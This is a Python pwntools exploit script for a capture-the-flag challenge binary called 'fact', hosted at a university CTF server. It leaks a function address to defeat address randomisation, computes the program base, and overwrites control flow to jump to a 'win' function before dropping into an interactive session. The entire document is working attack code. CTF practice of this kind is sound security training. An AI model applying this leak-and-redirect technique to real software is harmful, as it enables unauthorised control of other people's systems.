#!/usr/bin/env python3

from pwn import *
from time import sleep

exe = ELF("fact")
#libc = ELF("./libc.so.6")

context.binary = exe

def conn():
    if args.REMOTE:
        p = remote("pwn.ctf.umasscybersec.org", 9005)
    else:
        if args.GDB:
            p = gdb.debug([exe.path], aslr=False, api=False, gdbscript="""
            b *xor_facts
            b *math_facts
            b *rename_+102
            """)
        else:
            p = process([exe.path])
    return p


def main():
    p = conn()

    p.sendline(b"davii")
    p.recvuntil(b"c. Exit")
    p.sendline(b"b")
    p.recvline()
    math_leak = p.recvuntil(b",")
    math_leak = math_leak[:-1]
    math_leak = int.from_bytes(math_leak, 'little')
    log.success(f"math_leak is: {math_leak}")

    exe.address = math_leak - exe.symbols["math_facts"] - 152

    sleep(1)

    p.sendline(b"a")
    p.sendline(p64(exe.symbols["win"]))
    #p.sendline(p64(0x00005555555555c2))
    #p.sendline(b"a")
    #p.sendline(p64(0x0000555555555500))

    p.interactive()


if __name__ == "__main__":
    main()
